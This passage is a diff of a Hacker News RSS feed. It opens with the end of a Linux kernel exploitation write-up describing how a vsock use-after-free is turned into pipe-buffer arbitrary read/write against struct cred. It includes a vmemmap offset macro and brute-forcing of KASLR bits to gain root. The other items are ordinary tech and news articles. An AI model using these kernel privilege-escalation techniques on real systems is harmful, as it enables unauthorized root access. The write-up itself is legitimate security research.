+<p>My first thought was to overwrite part of the kernel code. But with KASLR enabled, I didn't know the physical address of kernel <code>_text</code> and therefore couldn't determine its location inside <code>vmemmap</code>.</p>
+
+<p>That's why I decided to use the pipe AARW against <code>struct cred</code> in the kernel heap. As I described earlier, I leaked the virtual address of <code>cred</code> using my <code>msg_msg</code> out-of-bounds read. This virtual address looked like <code>0xffff888003b7ad00</code>, and I understood it was from the direct mapping of all physical memory. So I used the following formula to calculate the offset of the corresponding <code>struct page</code> in <code>vmemmap</code>:</p>
+<div><pre><code><span>#define STRUCT_PAGE_SZ 64lu
+#define PAGE_ADDR_OFFSET(addr) (((addr &amp; 0x3ffffffflu) &gt;&gt; 12) * STRUCT_PAGE_SZ)
+</span><span>uaf_val</span> <span>=</span> <span>PAGE_ADDR_OFFSET</span><span>(</span><span>cred_addr</span><span>);</span>
+</code></pre></div>
+
+<p>The idea behind it is simple:</p>
+<ul>
+  <li><code>addr &amp; 0x3ffffffflu</code> gives the offset of the <code>struct cred</code> from the <code>page_offset_base</code>.</li>
+  <li>Right shift by 12 gives the number of the memory page containing <code>struct cred</code>.</li>
+  <li>Finally, multiplication by 64 (the size of <code>struct page</code>) gives the offset of the corresponding <code>struct page</code> in the <code>vmemmap</code>.</li>
+</ul>
+
+<p>This formula should be adapted if the system has more than 4 GiB of RAM. In that case, <code>ZONE_NORMAL</code> containing kernel allocations usually starts at address <code>0x100000000</code>. Hence, to calculate the offset of the needed <code>struct page</code>, we should add <code>(0x100000000 &gt;&gt; 12) * STRUCT_PAGE_SZ</code>.</p>
+
+<p>Excellent, the described formula is independent of KASLR for physical addresses, so I could use it to calculate the four lower bytes of the target address for exploiting the pipe AARW against the <code>struct cred</code>. Why I needed only four lower bytes of <code>pipe_buffer.page</code>:</p>
+<ul>
+  <li>My UAF write to <code>peer_buf_alloc</code> performed partial overwriting of the first half of the <code>pipe_buffer.page</code> pointer, as I showed at the diagram above.</li>
+  <li><code>x86_64</code> is little-endian, so the first half of the pointer contains four lower bytes of the address.</li>
+</ul>
+
+<p>But when I tried this approach, KASLR carried out its last revenge. It randomized the <code>vmemmap_base</code> address, and the four lower bytes of the <code>struct page</code> pointers carried <strong>two random bits</strong>. Ouch!</p>
+
+<p>However, I decided to brute-force those two bits because I could achieve the UAF write around 5 times before the kworker got a null-ptr-deref after <code>VSOCK_CLOSE_TIMEOUT</code> (8 sec).</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/bruteforce4.jpg" width="60%"></center>
+
+
+<p>I found that probing different values of <code>pipe_buffer.page</code> from userspace works perfectly well:</p>
+<ul>
+  <li>In case of fail, reading from the pipe simply returns <code>Bad address</code>.</li>
+  <li>In case of success, reading from the pipe gives <code>struct cred</code> contents.</li>
+</ul>
+
+<p>Great! I could finally determine a proper AARW target address, write to the pipe, overwrite euid and egid with 0, and get root. See the PoC exploit demo:</p>
+
+<p>
+  <iframe src="https://www.youtube.com/embed/qC95zkYnwb0" frameborder="0" allowfullscreen=""></iframe>
+</p>
+
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Bug collisions are painful. Finishing the research anyway is rewarding. Let me quote my good friend:</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/yoda.jpg" width="60%"></center>
+
+
+<p>Working on this hard race condition with multiple limitations allowed me to discover new exploitation techniques and to use and improve my pet project <a href="https://github.com/a13xp0p0v/kernel-hack-drill">kernel-hack-drill</a>, which provides a testing environment for Linux kernel security researchers. You are welcome to try it and contribute.</p>
+
+<p>Thanks for reading!</p>
+
+  </div>
+</article>
+
+      </div></div>]]></description>
+        </item>
+        <item>
+            <title><![CDATA[Lit: a library for building fast, lightweight web components (105 pts)]]></title>
+            <link>https://lit.dev</link>
+            <guid>45112720</guid>
+            <pubDate>Wed, 03 Sep 2025 06:14:22 GMT</pubDate>
+            <description><![CDATA[<p>URL: <a href="https://lit.dev">https://lit.dev</a>, See on <a href="https://news.ycombinator.com/item?id=45112720">Hacker News</a></p>
+<div id="readability-page-1" class="page"><div id="content"><section id="intro"><p id="tagline"><span>Simple.</span> <span>Fast.</span> <span>Web Components.</span></p></section><div id="advantages"><div><div><p><img fetchpriority="high" loading="lazy" src="https://lit.dev/images/home/standards.svg" width="300" height="300" alt=""></p><h2>Simple</h2></div><p>Skip the boilerplate</p><p>Building on top of the Web Components standards, Lit adds just what you need to be happy and productive: reactivity, declarative templates and a handful of thoughtful features to reduce boilerplate and make your job easier. Every Lit feature is carefully designed with web platform evolution in mind.</p></div><div><div><p><img fetchpriority="high" loading="lazy" src="https://lit.dev/images/home/lightning.svg" width="300" height="300" alt=""></p><h2>Fast</h2></div><p>Tiny footprint, instant updates</p><p>Weighing in at around 5 KB (minified and compressed), Lit helps keep your bundle size small and your loading time short. And rendering is blazing fast, because Lit touches only the dynamic parts of your UI when updating — no need to rebuild a virtual tree and diff it with the DOM.</p></div><div><div><p><img fetchpriority="high" loading="lazy" src="https://lit.dev/images/home/future.svg" width="300" height="300" alt=""></p><h2>Web Components</h2></div><p>Interoperable &amp; future-ready</p><p>Every Lit component is a native web component, with the superpower of interoperability. Web components work anywhere you use HTML, with any framework or none at all. This makes Lit ideal for building shareable components, design systems, or maintainable, future-ready sites and apps.</p></div></div><div id="tour"><div id="tourCode"><litdev-code-language-switch></litdev-code-language-switch><div id="tourTsCode"><figure><pre role="presentation"><span role="presentation"><span>import</span> {<span>html</span>, <span>css</span>, <span>LitElement</span>} <span>from</span> <span>'lit'</span>;</span></pre><pre role="presentation"><span role="presentation"><span>import</span> {<span>customElement</span>, <span>property</span>} <span>from</span> <span>'lit/decorators.js'</span>;</span></pre><pre role="presentation"><span role="presentation"><span cm-text="">
+</span></span></pre><pre role="presentation"><span role="presentation">@<span>customElement</span>(<span>'simple-greeting'</span>)</span></pre><pre role="presentation"><span role="presentation"><span>export</span> <span>class</span> <span>SimpleGreeting</span> <span>extends</span> <span>LitElement</span> {</span></pre><pre role="presentation"><span role="presentation">  <span>static</span> <span>styles</span> <span>=</span> <span>css</span><span>`</span><span>p</span> { <span>color</span>: <span>blue</span> }<span>`</span>;</span></pre><pre role="presentation"><span role="presentation"><span cm-text="">
+</span></span></pre><pre role="presentation"><span role="presentation">  @<span>property</span>()</span></pre><pre role="presentation"><span role="presentation">  <span>name</span> <span>=</span> <span>'Somebody'</span>;</span></pre><pre role="presentation"><span role="presentation"><span cm-text="">
+</span></span></pre><pre role="presentation"><span role="presentation">  <span>render</span>() {</span></pre><pre role="presentation"><span role="presentation">    <span>return</span> <span>html</span><span>`</span><span>&lt;p&gt;</span>Hello, <span>${</span><span>this</span>.<span>name</span><span>}</span>!<span>&lt;/p&gt;</span><span>`</span>;</span></pre><pre role="presentation"><span role="presentation">  }</span></pre><pre role="presentation"><span role="presentation">}</span></pre></figure></div><div id="tourJsCode"><figure><pre role="presentation"><span role="presentation"><span>import</span> {<span>html</span>, <span>css</span>, <span>LitElement</span>} <span>from</span> <span>'lit'</span>;</span></pre><pre role="presentation"><span role="presentation"><span cm-text="">
+</span></span></pre><pre role="presentation"><span role="presentation"><span>export</span> <span>class</span> <span>SimpleGreeting</span> <span>extends</span> <span>LitElement</span> {</span></pre><pre role="presentation"><span role="presentation">  <span>static</span> <span>styles</span> = <span>css</span><span>`</span><span>p</span> { <span>color</span>: <span>blue</span> }<span>`</span>;</span></pre><pre role="presentation"><span role="presentation"><span cm-text="">
+</span></span></pre><pre role="presentation"><span role="presentation">  <span>static</span> <span>properties</span> <span>=</span> {</span></pre><pre role="presentation"><span role="presentation">    <span>name</span>: {<span>type</span>: <span>String</span>},</span></pre><pre role="presentation"><span role="presentation">  };</span></pre><pre role="presentation"><span role="presentation"><span cm-text="">
+</span></span></pre><pre role="presentation"><span role="presentation">  <span>constructor</span>() {</span></pre><pre role="presentation"><span role="presentation">    <span>super</span>();</span></pre><pre role="presentation"><span role="presentation">    <span>this</span>.<span>name</span> <span>=</span> <span>'Somebody'</span>;</span></pre><pre role="presentation"><span role="presentation">  }</span></pre><pre role="presentation"><span role="presentation"><span cm-text="">
+</span></span></pre><pre role="presentation"><span role="presentation">  <span>render</span>() {</span></pre><pre role="presentation"><span role="presentation">    <span>return</span> <span>html</span><span>`</span><span>&lt;p&gt;</span>Hello, <span>${</span><span>this</span>.<span>name</span><span>}</span>!<span>&lt;/p&gt;</span><span>`</span>;</span></pre><pre role="presentation"><span role="presentation">  }</span></pre><pre role="presentation"><span role="presentation">}</span></pre><pre role="presentation"><span role="presentation"><span>customElements</span>.<span>define</span>(<span>'simple-greeting'</span>, <span>SimpleGreeting</span>);</span></pre></figure></div><div id="tourHtmlCode"><figure><pre role="presentation"><span role="presentation"><span>&lt;simple-greeting</span> <span>name</span>=<span>"World"</span><span>&gt;&lt;/simple-greeting&gt;</span></span></pre></figure></div><p><a id="playgroundLink" href="https://lit.dev/playground/">Edit this example in the Lit Playground</a></p></div><div id="tourNotes"><div id="tourNoteCustomElements" tabindex="0"><h2>Custom Elements</h2><p>Lit components are standard <em>custom elements</em>, so the browser treats them exactly like built-in elements. Use them in hand-written HTML or framework code, output them from your CMS or static site builder, even create instances in JavaScript — they just work!</p></div><div id="tourNoteStyles" tabindex="0"><h2>Scoped styles</h2><p>Lit scopes your styles by default, using <em>Shadow DOM</em>. This keeps your CSS selectors simple and ensures that your component’s styles don't affect — and aren't affected by — any other styles on the page.</p></div><div id="tourNoteProperties" tabindex="0"><h2>Reactive properties</h2><p>Declare <em>reactive properties</em> to model your component’s API and internal state. A Lit component efficiently re-renders whenever a reactive property (or corresponding HTML attribute) changes.</p></div><div id="tourNoteTemplates" tabindex="0"><h2>Declarative templates</h2><p>Lit templates, based on <em>tagged template literals</em>, are simple, expressive and fast, featuring HTML markup with native JavaScript expressions inline. No custom syntax to learn, no compilation required.</p></div></div></div><section id="buildAnythingWrapper"><h2>Build anything with Lit</h2><div id="buildAnything"><div><div><h2>Shareable Components</h2></div><p>Need to deliver interactive content or features that drop into any site, built on any stack? Because they're natively supported by browsers, web components are the perfect solution — and Lit makes them easy to build.</p></div><div><div><h2>Design Systems</h2></div><p>A design system helps you create experiences that are consistently excellent and on brand. But what if your organization uses multiple frameworks? With Lit, you can build one set of components that works for every team.</p></div><div><div><h2>Sites and Apps</h2></div><p>Use Lit components to progressively enhance a static site, or build an entire app. By embracing Web Components, Lit minimizes lock-in and promotes maintainability: update or migrate one component at a time, without disrupting product development.</p></div></div></section><div id="whoIsUsing"><h2>Many of the world's most forward-looking organizations are building with Lit</h2></div><section id="explore"><h2>Explore Lit</h2><div id="exploreItems"><h2>Try our live tutorials — no installation needed</h2><p><a href="https://lit.dev/learn/#filter=tutorial">Tutorials</a></p></div></section><div id="connect"><div id="connectLhs"><h2>Connect with Lit and the web components community</h2><p>Stay up to date with new releases, learn more about how to use web components and share projects and feedback with our team. All community participation is subject to Lit’s Code of Conduct — be excellent to each other!</p></div><div id="connectRhs"><ol id="connectList"><li><a href="https://lit.dev/discord/" target="_blank" rel="noopener"><span>Lit Discord</span> <span>Chat about Lit with the Lit community and dev team</span></a></li><li><a href="https://bsky.app/profile/lit.dev" target="_blank" rel="noopener"><span>Bluesky</span> <span>Stay up to date with the latest news</span></a></li><li><a href="https://github.com/lit/lit/" target="_blank" rel="noopener"><span>GitHub</span> <span>File issues, read the code, and make contributions</span></a></li><li><a href="https://stackoverflow.com/questions/tagged/lit+or+lit-html+or+lit-element" target="_blank" rel="noopener"><span>Stack Overflow</span> <span>Ask and answer questions about Lit</span></a></li></ol></div></div></div></div>]]></description>
+        </item>
+        <item>
+            <title><![CDATA[Finnish City Inaugurates 1 MW/100 MWh Sand Battery (131 pts)]]></title>
             <link>https://cleantechnica.com/2025/08/30/finnish-city-inaugurates-1-mw-100-mwh-sand-battery/</link>
             <guid>45112653</guid>
             <pubDate>Wed, 03 Sep 2025 06:00:47 GMT</pubDate>
@@ -70,7 +926,7 @@
 </div></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Zig Software Foundation 2025 Financial Report and Fundraiser (112 pts)]]></title>
+            <title><![CDATA[Zig Software Foundation 2025 Financial Report and Fundraiser (122 pts)]]></title>
             <link>https://ziglang.org/news/2025-financials/</link>
             <guid>45111405</guid>
             <pubDate>Wed, 03 Sep 2025 01:45:47 GMT</pubDate>
@@ -309,7 +1165,7 @@ from any single party. If not, don't sweat it. We'll be OK.</td>
   </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[I want to be left alone (2024) (153 pts)]]></title>
+            <title><![CDATA[I want to be left alone (2024) (155 pts)]]></title>
             <link>https://blog.ctms.me/posts/2024-07-26-i-want-to-be-left-alone/</link>
             <guid>45111179</guid>
             <pubDate>Wed, 03 Sep 2025 01:11:46 GMT</pubDate>
@@ -370,7 +1226,7 @@ from any single party. If not, don't sweat it. We'll be OK.</td>
 		</section></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[%CPU utilization is a lie (281 pts)]]></title>
+            <title><![CDATA[%CPU utilization is a lie (300 pts)]]></title>
             <link>https://www.brendanlong.com/cpu-utilization-is-a-lie.html</link>
             <guid>45110688</guid>
             <pubDate>Wed, 03 Sep 2025 00:01:02 GMT</pubDate>
@@ -378,7 +1234,7 @@ from any single party. If not, don't sweat it. We'll be OK.</td>
 <div id="readability-page-1" class="page"><section id="content"><article itemscope="" itemtype="http://schema.org/BlogPosting"><header></header><div itemprop="articleBody"><p>I deal with a lot of servers at work, and one thing everyone wants to know about their servers is how close they are to being at max utilization. It should be easy, right? Just pull up <code>top</code> or another system monitor tool, look at network, memory and CPU utilization, and whichever one is the highest tells you how close you are to the limits.</p><p><img alt="A screenshot of a system monitor app showing 24 cores, half of which are at 100% utitilization and half of which are close to 0%." src="https://www.brendanlong.com/images/cpu-utilization-lie/system-monitor-screenshot.png"></p><p>For example, this machine is at 50% CPU utilization, so it can <a href="#matrix-math">probably do twice as much of whatever it's doing</a>.</p><p>And yet, whenever people actually try to project these numbers, they find that CPU utilization doesn't quite increase linearly. <strong>But how bad could it possibly be?</strong></p><p>To answer this question, I ran a bunch of stress tests and monitored both how much work they did and what the system-reported CPU utilization was, then graphed the results.</p><h2 id="setup"><a href="#setup">Setup</a></h2><p>For my test machine, I used a desktop computer running Ubuntu with a <a href="https://www.amd.com/en/products/processors/desktops/ryzen/5000-series/amd-ryzen-9-5900x.html">Ryzen 9 5900X</a> (12 core / 24 thread) processor. I also enabled <a href="https://www.amd.com/en/resources/support-articles/faqs/CPU-PB2.html">Precision Boost Overdrive</a> (i.e. <a href="https://en.wikipedia.org/wiki/AMD_Turbo_Core">Turbo</a>).</p><p>I vibe-coded <a href="https://github.com/brendanlong/cpu-utilization-graphs">a script</a> that runs <a href="https://github.com/ColinIanKing/stress-ng">stress-ng</a> in a loop, first using 24 workers and attempting to run them each at different utilizations from 1% to 100%, then using 1 to 24 workers all at 100% utilization. It used different stress testing method and measured the number of operations that could be completed ("Bogo ops<sup id="fnref:jvyu8i00sms"><a href="#fn:jvyu8i00sms">1</a></sup>").</p><p>The reason I did two different methods was that operating systems are smart about how they schedule work, and scheduling a small number of workers at 100% utilization can be done optimally (spoilers) but with 24 workers all at 50% utilization it's hard for the OS to do anything other than spreading the work evenly.</p><h2 id="results"><a href="#results">Results</a></h2><p>You can see <a href="https://docs.google.com/spreadsheets/d/1QKdYa3NIFGTixG_LdnsbwbeLDnE2GNVVsS9-dfkcT20/edit?usp=sharing">the raw CSV results here</a>.</p><h2 id="general-cpu"><a href="#general-cpu">General CPU</a></h2><p>The most basic test just runs all of stress-ng's CPU stress tests in a loop.</p><p><img alt="" src="https://www.brendanlong.com/images/cpu-utilization-lie/cpu_utilization_analysis_cpu.png"></p><p>You can see that when the system is reporting 50% CPU utilization, it's actually doing 60-65% of the actual maximum work it can do.</p><h2 id="64-bit-integer-math"><a href="#64-bit-integer-math">64-bit Integer Math</a></h2><p>But maybe that one was just a fluke. What if we just run some random math on 64-bit integers?</p><p><img alt="" src="https://www.brendanlong.com/images/cpu-utilization-lie/cpu_utilization_analysis_int64.png"></p><p>This one is even worse! At "50% utilization", we're actually doing 65-85% of the max work we can get done. It can't possibly get worse than that though, right?</p><h2 id="matrix-math"><a href="#matrix-math">Matrix Math</a></h2><p><img alt="" src="https://www.brendanlong.com/images/cpu-utilization-lie/cpu_utilization_analysis_matrixprod.png"></p><p>Something is definitely off. <strong>Doing matrix math, "50% utilization" is actually 80% to 100% of the max work that can be done.</strong></p><p>In case you were wondering about the system monitor screenshot from the start of the article, that was a matrix math test running with 12 workers, and you can see that it really did report 50% utilization even though additional workers do absolutely nothing (except make the utilization number go up).</p><h2 id="whats-going-on"><a href="#whats-going-on">What's Going On?</a></h2><h2 id="hyperthreading"><a href="#hyperthreading">Hyperthreading</a></h2><p>You might notice that this the graph keeps changing at 50%, and I've helpfully added piecewise linear regressions showing the fit.</p><p>The main reason this is happening is <a href="https://en.wikipedia.org/wiki/Hyper-threading">hyperthreading</a>: Half of the "cores" on this machine (and most machines) are sharing resources with other cores. If I run 12 workers on this machine, they each get scheduled on their own physical core with no shared resources, but once I go over that, each additional worker is sharing resources with another. In some cases (general CPU benchmarks), this makes things slightly worse, and in some cases (<a href="https://en.wikipedia.org/wiki/Single_instruction,_multiple_data">SIMD</a>-heavy matrix math), there are no useful resources left to share.</p><h2 id="turbo"><a href="#turbo">Turbo</a></h2><p>It's harder to see, but <a href="https://en.wikipedia.org/wiki/AMD_Turbo_Core">Turbo</a> is also having an effect. This particular processor runs at 4.9 GHz at low utilization, but slowly drops to 4.3 GHz as more cores become active<sup id="fnref:yk2lmnusjj"><a href="#fn:yk2lmnusjj">2</a></sup>.</p><p><img alt="" src="https://www.brendanlong.com/images/cpu-utilization-lie/clock_speed_vs_cpu_all.png"></p><p>Note the zoomed-in y-axis. The clock speed "only" drops by 15% on this processor.</p><p>Since CPU utilization is calculated as busy cycles / total cycles, this means the denominator is getting smaller as the numerator gets larger, so we get yet another reason why actual CPU utilization increases faster than linearly.</p><h2 id="does-this-matter"><a href="#does-this-matter">Does This Matter?</a></h2><p><img alt="" src="https://www.brendanlong.com/images/cpu-utilization-lie/cpu_utilization_combined_adjusted.png"></p><p>If you look at CPU utilization and assume it will increase linearly, you're going to have a rough time. If you're using the CPU efficiently (running above "50%" utilization), the reported utilization is an underestimate, sometimes significantly so.</p><p>And keep in mind that I've only shown results for one processor, but hyperthreading performance and Turbo behavior can vary wildly between different processors, especially from different companies (AMD vs Intel).</p><p>The best way I know to work around this is to run benchmarks and monitor actual work done:</p><ol><li>Benchmark how much work your server can do before having errors or unacceptable latency.</li><li>Report how much work your server is currently doing.</li><li>Compare those two metrics instead of CPU utilization.</li></ol></div></article></section></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[This blog is running on a recycled Google Pixel 5 (2024) (224 pts)]]></title>
+            <title><![CDATA[This blog is running on a recycled Google Pixel 5 (2024) (236 pts)]]></title>
             <link>https://blog.ctms.me/posts/2024-08-29-running-this-blog-on-a-pixel-5/</link>
             <guid>45110209</guid>
             <pubDate>Tue, 02 Sep 2025 22:58:23 GMT</pubDate>
@@ -477,7 +1333,7 @@ from any single party. If not, don't sweat it. We'll be OK.</td>
 		</section></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[You're Not Interviewing for the Job. You're Auditioning for the Job Title (102 pts)]]></title>
+            <title><![CDATA[You're Not Interviewing for the Job. You're Auditioning for the Job Title (108 pts)]]></title>
             <link>https://idiallo.com/blog/performing-for-the-job-title</link>
             <guid>45109324</guid>
             <pubDate>Tue, 02 Sep 2025 21:31:37 GMT</pubDate>
@@ -617,7 +1473,7 @@ Finally, you debate consensus algorithms for a blog comment system, mention obse
 	</div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Google gets to keep Chrome but is barred from exclusive search deals (744 pts)]]></title>
+            <title><![CDATA[Google gets to keep Chrome but is barred from exclusive search deals (756 pts)]]></title>
             <link>https://www.cnbc.com/2025/09/02/google-antitrust-search-ruling.html</link>
             <guid>45108548</guid>
             <pubDate>Tue, 02 Sep 2025 20:26:47 GMT</pubDate>
@@ -625,7 +1481,7 @@ Finally, you debate consensus algorithms for a blog comment system, mention obse
 <div id="readability-page-1" class="page"><div id="RegularArticle-ArticleBody-5" data-module="ArticleBody" data-test="articleBody-2" data-analytics="RegularArticle-articleBody-5-2"><div id="ArticleBody-InlineImage-108136021" data-test="InlineImage"><p>Google CEO Sundar Pichai during the press conference after his meeting with Polish PM Donald Tusk at Google for Startups Campus In Warsaw in Warsaw, Poland on February 13, 2025. Images)</p><p>Jakub Porzycki | Nurphoto | Getty Images</p></div><div><p>A federal judge ruled Tuesday that the company can keep its <a href="https://www.cnbc.com/2025/08/12/perplexity-google-chrome-ai.html">Chrome</a> browser but will be barred from exclusive contracts and must share search data.</p><p><span data-test="QuoteInBody" id="RegularArticle-QuoteInBody-2"><a href="https://www.cnbc.com/quotes/GOOGL/">Alphabet</a><span><span id="-WatchlistDropdown" data-analytics-id="-WatchlistDropdown"></span></span></span> shares popped 8% in extended trading as investors celebrated what they viewed as minimal consequences from a historic defeat last year in the landmark antitrust case that found it held an illegal monopoly in its core market of internet search.</p><p>U.S. District Judge Amit Mehta ruled against the most severe consequences that were proposed by the U.S. Department of Justice, including selling off its Chrome browser, which provides data that helps its advertising business deliver targeted ads.&nbsp;</p><p>"Google will not be required to divest Chrome; nor will the court include a contingent divestiture of the Android operating system in the final judgment," the decision stated. "Plaintiffs overreached in seeking forced divesture of these key assets, which Google did not use to effect any illegal restraints."</p><p>The company can make payments to preload products, but it cannot have exclusive contracts, the decision stated.</p><p>The DOJ asked Google to stop the practice of "compelled syndication," which refers to the practice of making certain deals with companies to ensure its search engine remains the default choice in browsers and smartphones.&nbsp;</p><p>Google pays&nbsp;<a href="https://www.cnbc.com/quotes/AAPL/">Apple</a><strong> </strong>billions of dollars per year to be the default search engine on iPhones. It's lucrative for Apple and a valuable way for Google to get more search volume and users.</p><p>Apple shares rose 4% on Tuesday after hours.</p><p>The judge ordered the parties to meet by September 10th for the final judgement.</p></div><div id="RegularArticle-RelatedContent-1"><h2>Read more CNBC tech news</h2><div><ul><li><a href="https://www.cnbc.com/2025/09/02/klarna-ipo-in-us-to-raise-up-to-1point27-billion-in.html">Klarna aims to raise up to $1.27 billion in U.S. IPO</a></li><li><a href="https://www.cnbc.com/2025/08/29/tesla-appeal-benavides-verdict-autopilot-crash.html">Tesla asks for $243 million verdict to be tossed in fatal Autopilot crash suit</a></li><li><a href="https://www.cnbc.com/2025/08/29/alibaba-is-developing-a-new-ai-chip-heres-what-we-know-so-far.html">Alibaba is developing a new AI chip — here's what we know so far</a></li><li><a href="https://www.cnbc.com/2025/08/29/meta-ai-chatbot-teen-senate-probe.html">Meta changes teen AI chatbot responses as Senate begins probe into 'romantic' conversations</a></li></ul></div></div><div><p>"Google will not be barred from making payments or offering other consideration to distribution partners for preloading or placement of Google Search, Chrome, or its GenAI products. Cutting off payments from Google almost certainly will impose substantial—in some cases, crippling—downstream harms to distribution partners, related markets, and consumers, which counsels against a broad payment ban."</p><p>In a&nbsp;<a href="https://www.cnbc.com/2023/09/11/google-to-face-doj-in-the-first-major-tech-monopoly-trial-in-decades.html">landmark case</a> filed in 2020, the U.S. Department of Justice alleged that Google kept its share of the general search market by creating strong barriers to entry and a feedback loop that sustained its dominance.</p><p>The U.S. District Court for the District of Columbia <a href="https://www.cnbc.com/2024/08/05/google-loses-antitrust-case-over-search.html">ruled</a> in August 2024 that Google violated Section 2 of the Sherman Act, which outlaws monopolies.</p><p>Mehta&nbsp;oversaw the remedies trial in May, where the two parties proposed penalties that should be taken against Google as a result of the monopoly ruling. During that trial, the DOJ asked the judge to force Google to&nbsp;share the data it uses for generating search results, such as data about what users click on</p><p>Google said it will <a href="https://www.cnbc.com/2025/05/31/google-says-it-will-appeal-online-search-antitrust-decision.html">appeal</a> the ruling, which would delay any potential penalties.</p><p>Mehta ruled Tuesday that Google will have to make available certain search index data and user interaction data, though "not ads data". </p><p>The court narrowed the datasets Google will be required to share and said they must occur on "ordinary commercial terms that are consistent with Google's current syndication services."</p></div><div><div role="button" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" width="256" height="256" viewBox="0 0 256 256" aria-labelledby="title desc" role="img" focusable="false" preserveAspectRatio="xMinYMin"><title>Stock Chart Icon</title><desc>Stock chart icon</desc><g transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)"><path d="M 87.994 0 H 69.342 c -1.787 0 -2.682 2.16 -1.418 3.424 l 5.795 5.795 l -33.82 33.82 L 28.056 31.196 l -3.174 -3.174 c -1.074 -1.074 -2.815 -1.074 -3.889 0 L 0.805 48.209 c -1.074 1.074 -1.074 2.815 0 3.889 l 3.174 3.174 c 1.074 1.074 2.815 1.074 3.889 0 l 15.069 -15.069 l 14.994 14.994 c 1.074 1.074 2.815 1.074 3.889 0 l 1.614 -1.614 c 0.083 -0.066 0.17 -0.125 0.247 -0.202 l 37.1 -37.1 l 5.795 5.795 C 87.84 23.34 90 22.445 90 20.658 V 2.006 C 90 0.898 89.102 0 87.994 0 z" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path><path d="M 65.626 37.8 v 49.45 c 0 1.519 1.231 2.75 2.75 2.75 h 8.782 c 1.519 0 2.75 -1.231 2.75 -2.75 V 23.518 L 65.626 37.8 z" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path><path d="M 47.115 56.312 V 87.25 c 0 1.519 1.231 2.75 2.75 2.75 h 8.782 c 1.519 0 2.75 -1.231 2.75 -2.75 V 42.03 L 47.115 56.312 z" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path><path d="M 39.876 60.503 c -1.937 0 -3.757 -0.754 -5.127 -2.124 l -6.146 -6.145 V 87.25 c 0 1.519 1.231 2.75 2.75 2.75 h 8.782 c 1.519 0 2.75 -1.231 2.75 -2.75 V 59.844 C 41.952 60.271 40.933 60.503 39.876 60.503 z" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path><path d="M 22.937 46.567 L 11.051 58.453 c -0.298 0.298 -0.621 0.562 -0.959 0.8 V 87.25 c 0 1.519 1.231 2.75 2.75 2.75 h 8.782 c 1.519 0 2.75 -1.231 2.75 -2.75 V 48.004 L 22.937 46.567 z" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path></g></svg><p><img src="https://static-redesign.cnbcfm.com/dist/a54b41835a8b60db28c2.svg" alt="hide content"></p></div><p>Google and Apple one-day stock chart.</p></div><div id="Placeholder-ArticleBody-Video-108171586" data-test="VideoPlaceHolder" role="region" tabindex="0" data-vilynx-id="7000382261" aria-labelledby="Placeholder-ArticleBody-Video-108171586"><p><img src="https://image.cnbcfm.com/api/v1/image/108171587-17525082581752508253-40717529609-1080pnbcnews.jpg?v=1752508257&amp;w=750&amp;h=422&amp;vtcrop=y" alt="Google snatches Windsurf CEO after OpenAI deal dissolves"><span></span><span></span></p></div></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[U.S. Emissions Rise 4.2%, China's Fall 2.7% (180 pts)]]></title>
+            <title><![CDATA[U.S. Emissions Rise 4.2%, China's Fall 2.7% (181 pts)]]></title>
             <link>https://www.theenergymix.com/u-s-emissions-rise-chinas-fall-in-massive-shift-between-worlds-biggest-climate-polluters/</link>
             <guid>45108292</guid>
             <pubDate>Tue, 02 Sep 2025 20:02:57 GMT</pubDate>
@@ -769,7 +1625,7 @@ Finally, you debate consensus algorithms for a blog comment system, mention obse
 </div>			</div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Making a Linux home server sleep on idle and wake on demand (2023) (237 pts)]]></title>
+            <title><![CDATA[Making a Linux home server sleep on idle and wake on demand (2023) (243 pts)]]></title>
             <link>https://dgross.ca/blog/linux-home-server-auto-sleep</link>
             <guid>45108066</guid>
             <pubDate>Tue, 02 Sep 2025 19:42:48 GMT</pubDate>
@@ -1182,7 +2038,7 @@ systemctl status avahi-publish.service
       </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[A staff engineer's journey with Claude Code (375 pts)]]></title>
+            <title><![CDATA[A staff engineer's journey with Claude Code (398 pts)]]></title>
             <link>https://www.sanity.io/blog/first-attempt-will-be-95-garbage</link>
             <guid>45107962</guid>
             <pubDate>Tue, 02 Sep 2025 19:34:24 GMT</pubDate>
@@ -1190,7 +2046,7 @@ systemctl status avahi-publish.service
 <div id="readability-page-1" class="page"><!--$--><!--$?--><template id="B:0"></template><!--/$--><!--3--><!--/$--><title>First attempt will be 95% garbage: A staff engineer's 6-week journey with Claude Code | Sanity</title><meta name="description" content="This started as an internal Sanity workshop where I demoed how I actually use AI. Spoiler: it's running multiple agents like a small team with daily amnesia."><meta name="google-site-verification" content="RjrkDVDuEpQIbe4iNq9LjZKuvTwlJCADdY1jZNjuItY"><meta name="google-site-verification" content="6axnRgH1VVzoyqB3J4uGuOQ98xzHBmAIEaHKWdVCBXg"><meta property="og:title" content="First attempt will be 95% garbage: A staff engineer's 6-week journey with Claude Code | Sanity"><meta property="og:description" content="This started as an internal Sanity workshop where I demoed how I actually use AI. Spoiler: it's running multiple agents like a small team with daily amnesia."><meta property="og:site_name" content="Sanity.io"><meta property="og:image" content="https://cdn.sanity.io/images/3do82whm/next/776b067d1aeef70752bc0350901ca5c05450d85c-1280x720.png"><meta property="og:type" content="website"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@sanity_io"><meta name="twitter:title" content="First attempt will be 95% garbage: A staff engineer's 6-week journey with Claude Code | Sanity"><meta name="twitter:description" content="This started as an internal Sanity workshop where I demoed how I actually use AI. Spoiler: it's running multiple agents like a small team with daily amnesia."><meta name="twitter:image" 